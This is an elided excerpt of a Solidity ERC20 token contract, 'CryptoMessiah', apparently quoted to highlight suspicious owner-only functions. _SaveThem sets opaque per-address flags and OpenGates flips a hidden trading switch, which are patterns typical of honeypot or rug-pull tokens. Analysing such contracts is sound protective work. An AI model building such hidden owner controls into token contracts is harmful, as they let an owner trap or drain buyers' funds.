...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _SaveThem(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function OpenGates() external onlyOwner() {
        _gottaCatchThemAll = true;
    }
}

contract ERC20Messiah is Context, ERC20 {
    constructor(
...
contract CryptoMessiah is ERC20Messiah {
    constructor() ERC20Messiah("CryptoMessiah", "MESSIAH", false, true, 1100, 15, msg.sender, 20929979 * 10 ** 18, msg.sender, 7) {
    }
}
